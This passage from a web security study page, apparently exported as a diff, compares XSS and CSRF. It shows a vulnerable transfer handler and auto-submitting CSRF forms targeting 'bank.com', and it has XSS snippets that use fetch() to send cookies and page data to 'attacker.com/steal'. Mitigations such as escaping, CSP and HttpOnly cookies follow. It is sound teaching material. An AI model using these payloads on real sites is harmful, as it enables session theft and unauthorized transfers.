+    to_account = request.form.get(&#x27;to&#x27;)
+    transfer_money(amount, to_account)  # CSRF!
+    return &quot;Transfer successful&quot;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8083-be29-dd1cd4369e25" class=""><strong>Attack:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8053-9c6d-c3797be9aa1d" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;!-- Attacker&#x27;s malicious page (evil.com) --&gt;
+&lt;form id=&quot;transfer&quot; action=&quot;https://bank.com/transfer&quot; method=&quot;POST&quot;&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;to&quot; value=&quot;attacker_account&quot; /&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;10000&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById(&#x27;transfer&#x27;).submit();&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8000-a655-d58e609c353d" class=""><strong>Result:</strong> Victim&#x27;s browser submits transfer request automatically</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8004-9951-dfb1771dc473"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8041-a0ba-fca3afa45bb7" class=""><strong>Key Differences</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8001-ab4c-cf162345a5c7" class=""><strong>1. Attack Goal</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-805a-be9b-de3b8425a892" class=""><strong>XSS:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8082-8808-d1db4e9f9e37" class="bulleted-list"><li style="list-style-type:disc"><strong>Goal</strong>: Execute malicious scripts in victim&#x27;s browser</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8050-92f6-da843b9e11c9" class="bulleted-list"><li style="list-style-type:disc"><strong>Focus</strong>: Code execution in browser context</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8080-9299-c9c4c374c6c4" class=""><strong>CSRF:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a7-b515-c875d07c33d7" class="bulleted-list"><li style="list-style-type:disc"><strong>Goal</strong>: Trick victim into submitting requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80cf-89ac-f814f8f2690e" class="bulleted-list"><li style="list-style-type:disc"><strong>Focus</strong>: Unauthorized actions on server</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80bb-addb-fe4e9ad65c51"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80fa-8fcc-c1ad8b8577b4" class=""><strong>2. What They Exploit</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80b6-b55f-dfbc62ba3852" class=""><strong>XSS:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-806f-b520-e38c71f37ffa" class="bulleted-list"><li style="list-style-type:disc"><strong>Exploits</strong>: Trust application has in user input</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a1-82ea-ed450763e79c" class="bulleted-list"><li style="list-style-type:disc"><strong>Target</strong>: Application&#x27;s output encoding</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-801a-9f03-d00003456cae" class=""><strong>CSRF:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f5-9715-e5931d7bb9cd" class="bulleted-list"><li style="list-style-type:disc"><strong>Exploits</strong>: Trust browser has in application (automatic cookie sending)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8012-88fc-e6db83680d53" class="bulleted-list"><li style="list-style-type:disc"><strong>Target</strong>: Application&#x27;s request validation</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80dc-a755-cb71e62d88b1"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80da-b2ed-e935cba8759e" class=""><strong>3. Execution Location</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8088-9ad9-f0b607485a3c" class=""><strong>XSS:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80ef-a9ee-e32f1de18321" class="bulleted-list"><li style="list-style-type:disc"><strong>Location</strong>: Victim&#x27;s browser</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8001-a559-eda6c39720ca" class="bulleted-list"><li style="list-style-type:disc"><strong>Execution</strong>: Client-side JavaScript</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80fd-83ab-f6441cdf49ca" class=""><strong>CSRF:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80ac-922d-d26183461de8" class="bulleted-list"><li style="list-style-type:disc"><strong>Location</strong>: Server-side</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c6-8c62-cd945eaf0341" class="bulleted-list"><li style="list-style-type:disc"><strong>Execution</strong>: Server processes request</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80fa-93f1-f6e2e1a54a7e"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80bb-b79f-fe95fa5cedd3" class=""><strong>4. Attack Vector</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-805a-901f-ed909e1dd16c" class=""><strong>XSS:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b9-a9cb-c9ff6ad18e52" class="bulleted-list"><li style="list-style-type:disc"><strong>Vector</strong>: Script injection</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-802d-a23d-c184a79d022a" class="bulleted-list"><li style="list-style-type:disc"><strong>Payload</strong>: JavaScript code</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-805b-8c53-c8d6ea2219a5" class="bulleted-list"><li style="list-style-type:disc"><strong>Entry</strong>: User input fields, URL parameters, etc.</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-808a-9feb-f32b4dc6218e" class=""><strong>CSRF:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-806a-a8d8-c7c64d30fe74" class="bulleted-list"><li style="list-style-type:disc"><strong>Vector</strong>: Form submission</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e8-b210-d2c8a0ac636a" class="bulleted-list"><li style="list-style-type:disc"><strong>Payload</strong>: HTTP request</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f7-b241-e610932d750b" class="bulleted-list"><li style="list-style-type:disc"><strong>Entry</strong>: Malicious website visited by victim</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8016-8fe4-f4704566fe03"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8014-8ddb-d2901820dfdd" class=""><strong>5. Target Audience</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e5-a6e3-c9c4c346d931" class=""><strong>XSS:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8020-b27b-e59b0771bc91" class="bulleted-list"><li style="list-style-type:disc"><strong>Target</strong>: Other users viewing the page</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8069-8b85-f9cb96ec5897" class="bulleted-list"><li style="list-style-type:disc"><strong>Scope</strong>: Can affect multiple users</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8003-8ea9-c2d09ad406ec" class="bulleted-list"><li style="list-style-type:disc"><strong>Persistence</strong>: Can be stored (stored XSS)</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e9-a456-e7aff531a130" class=""><strong>CSRF:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-805f-b59c-ce41b71a5c41" class="bulleted-list"><li style="list-style-type:disc"><strong>Target</strong>: Authenticated users (usually the victim themselves)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d5-b8fc-eefb66adb38d" class="bulleted-list"><li style="list-style-type:disc"><strong>Scope</strong>: Affects individual user&#x27;s session</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8068-b33d-dc7a6404c251" class="bulleted-list"><li style="list-style-type:disc"><strong>Persistence</strong>: One-time attack per victim</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-800e-a466-dbc0d1df9ef9"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-805f-b940-e3d746f706ac" class=""><strong>6. Requirements</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80f3-b879-c3571b21e01e" class=""><strong>XSS:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80cd-b994-e49246063305" class="bulleted-list"><li style="list-style-type:disc"><strong>Requires</strong>: User input reflected/stored in page</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8088-9a38-c6347e9bfaf9" class="bulleted-list"><li style="list-style-type:disc"><strong>Doesn&#x27;t Require</strong>: User authentication (can affect anonymous users)</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d2-877b-e3807f5ca4dd" class=""><strong>CSRF:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8019-822d-c96ac5320707" class="bulleted-list"><li style="list-style-type:disc"><strong>Requires</strong>: User authentication (session cookie)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-809a-9bb5-fa92c80f9cfe" class="bulleted-list"><li style="list-style-type:disc"><strong>Doesn&#x27;t Require</strong>: XSS vulnerability</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-807b-bd77-eace41e6623a"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80ec-bf80-d1590e249a79" class=""><strong>7. Mitigation</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8079-b92d-e9925dbf454b" class=""><strong>XSS:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-803b-a46c-dc5b5b87444c" class="bulleted-list"><li style="list-style-type:disc"><strong>Primary</strong>: Output encoding</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8010-a2c0-c8595bf082d5" class="bulleted-list"><li style="list-style-type:disc"><strong>Secondary</strong>: Content Security Policy (CSP)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8058-8985-daafe9d5d75c" class="bulleted-list"><li style="list-style-type:disc"><strong>Additional</strong>: Input validation, HttpOnly cookies</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8033-b398-e78f9837dace" class=""><strong>CSRF:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8055-bec5-f3b8f9808556" class="bulleted-list"><li style="list-style-type:disc"><strong>Primary</strong>: CSRF tokens</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8048-aebb-c062bbe4ba75" class="bulleted-list"><li style="list-style-type:disc"><strong>Secondary</strong>: SameSite cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8009-8a3b-fc17d7c33b78" class="bulleted-list"><li style="list-style-type:disc"><strong>Additional</strong>: Origin/Referer header validation</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8088-9354-cd2035620b40"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8015-a31a-e4481acf2f9c" class=""><strong>Similarities</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8074-a088-d215206cd1a0" class=""><strong>1. Both are &quot;Cross-Site&quot; Attacks</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-806c-ba09-c31f8fbd0da0" class=""><strong>XSS:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8089-a40a-f6c60642f12f" class="bulleted-list"><li style="list-style-type:disc">Attack originates from one site</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80bb-a6eb-f54b316fe819" class="bulleted-list"><li style="list-style-type:disc">Affects another site</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80ce-8e4d-cde0c49e7195" class="bulleted-list"><li style="list-style-type:disc">Uses malicious input from attacker</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-804b-8c9f-c47f75584325" class=""><strong>CSRF:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80bb-9720-c943cd55a7d7" class="bulleted-list"><li style="list-style-type:disc">Attack originates from one site (attacker&#x27;s)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f0-a7b4-c7ce92ff8cad" class="bulleted-list"><li style="list-style-type:disc">Affects another site (target)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8054-be18-d82c58ca8a9b" class="bulleted-list"><li style="list-style-type:disc">Uses victim&#x27;s browser to make requests</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8047-ab55-d8d481109510"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-800d-9083-c1de2cac3c94" class=""><strong>2. Both Exploit Trust</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e4-bcb3-d43bfc8d8448" class=""><strong>XSS:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-805d-8a4d-f3b20f64ec29" class="bulleted-list"><li style="list-style-type:disc">Exploits application&#x27;s trust in user input</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8076-b033-f1d543f7afc0" class="bulleted-list"><li style="list-style-type:disc">Application trusts input is safe</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8091-90fb-f991c94ce112" class=""><strong>CSRF:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80fa-a6ec-c235a48e359a" class="bulleted-list"><li style="list-style-type:disc">Exploits browser&#x27;s trust in application</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8086-9cdb-dd6c1afd1c72" class="bulleted-list"><li style="list-style-type:disc">Browser automatically includes cookies</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80e9-85cb-ddb42e543ff0"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-802e-a6e0-c11a49e6c093" class=""><strong>3. Both Can Lead to Account Compromise</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8053-9050-c6f2515bc8bb" class=""><strong>XSS:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80bd-b460-c60172f786de" class="bulleted-list"><li style="list-style-type:disc">Steal session cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8092-9001-ec87617d7fd6" class="bulleted-list"><li style="list-style-type:disc">Hijack user sessions</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8080-8f07-e4cff556d0ee" class="bulleted-list"><li style="list-style-type:disc">Perform actions as user</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-804e-a976-e18401374d51" class=""><strong>CSRF:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80de-9b36-c2780978fc87" class="bulleted-list"><li style="list-style-type:disc">Perform unauthorized actions</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d8-b63a-c8faf81eb570" class="bulleted-list"><li style="list-style-type:disc">Change account settings</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a8-8efb-c2c31222687b" class="bulleted-list"><li style="list-style-type:disc">Transfer funds, delete data</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-801b-8ecb-c2ce711750f0"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80d1-9219-fee901396e53" class=""><strong>4. Both Require Defense in Depth</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803c-8f6a-e97d5d483eff" class=""><strong>XSS:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8042-bb62-f1bd58bac5b8" class="bulleted-list"><li style="list-style-type:disc">Multiple layers: encoding, CSP, validation</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8012-b4d9-e97421be3861" class=""><strong>CSRF:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-804e-9b48-d23db0a10a35" class="bulleted-list"><li style="list-style-type:disc">Multiple layers: tokens, SameSite, headers</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-807c-a07f-f8d582bb06e3"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8082-a639-fcd7c5022576" class=""><strong>Attack Scenarios Comparison</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8034-98ab-f0d01c7496f1" class=""><strong>Scenario 1: Account Takeover</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8003-9d7a-df7325202954" class=""><strong>XSS Approach:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80e8-a720-ed27de2340cb" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Attacker injects script
+&lt;script&gt;
+  fetch(&#x27;http://attacker.com/steal?cookie=&#x27; + document.cookie);
+&lt;/script&gt;
+
+// Result: Attacker steals session cookie
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-808b-bc28-d07b994fbc77" class=""><strong>CSRF Approach:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-804c-9f51-d6b3bfe6a1f6" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;!-- Attacker creates malicious form --&gt;
+&lt;form action=&quot;https://bank.com/change-email&quot; method=&quot;POST&quot;&gt;
+  &lt;input name=&quot;email&quot; value=&quot;attacker@evil.com&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+
+// Result: Attacker changes victim&#x27;s email
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80ae-a448-d8b7c25c5bec"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-804e-9f74-eeb66950dab1" class=""><strong>Scenario 2: Data Theft</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8019-a6da-c170735c35d9" class=""><strong>XSS Approach:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-806f-8707-cee8a9002f89" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Extract data from page
+&lt;script&gt;
+  var data = document.getElementById(&#x27;sensitive-data&#x27;).innerHTML;
+  fetch(&#x27;http://attacker.com/steal?data=&#x27; + encodeURIComponent(data));
+&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-809f-bf02-f881d3b75a88" class=""><strong>CSRF Approach:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8036-883a-cda11e5b639b" class="bulleted-list"><li style="list-style-type:disc">Cannot directly extract data</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-808f-b2c8-cf8722943adc" class="bulleted-list"><li style="list-style-type:disc">Must perform actions that expose data</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8066-b796-fdc1e9b51acd" class="bulleted-list"><li style="list-style-type:disc">Limited to actions available via forms</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80bf-8772-f09d3e7521e7"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80ee-b647-e607a9f764d7" class=""><strong>Scenario 3: Unauthorized Actions</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8038-a8a6-f2550fe5f410" class=""><strong>XSS Approach:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8072-a1ae-f96fbc1bb1c8" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Perform action via JavaScript
+&lt;script&gt;
+  fetch(&#x27;/api/delete&#x27;, {method: &#x27;POST&#x27;, body: &#x27;id=123&#x27;});
+&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8036-ac8b-dbbfd9d2a511" class=""><strong>CSRF Approach:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8001-bd8e-ed26f9eeb24e" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;!-- Perform action via form --&gt;
+&lt;form action=&quot;/api/delete&quot; method=&quot;POST&quot;&gt;
+  &lt;input name=&quot;id&quot; value=&quot;123&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8032-934d-dbba39989856"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-80e1-be31-ea44088f96a3" class=""><strong>Mitigation Comparison</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80f8-8ba2-f689ca477fcd" class=""><strong>XSS Mitigation</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8083-b430-df9307037bfa" class=""><strong>1. Output Encoding:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80d6-ab92-c31f7617e286" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from html import escape
+
+def display_comment(comment):
+    return escape(comment)  # HTML encoding
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8013-a1d2-cf7779d8b1b6" class=""><strong>2. Content Security Policy:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8078-9405-f509da5a8937" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8074-b0fc-e220cd160aca" class=""><strong>3. HttpOnly Cookies:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8006-8d48-caa871992825" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: session=abc123; HttpOnly; Secure
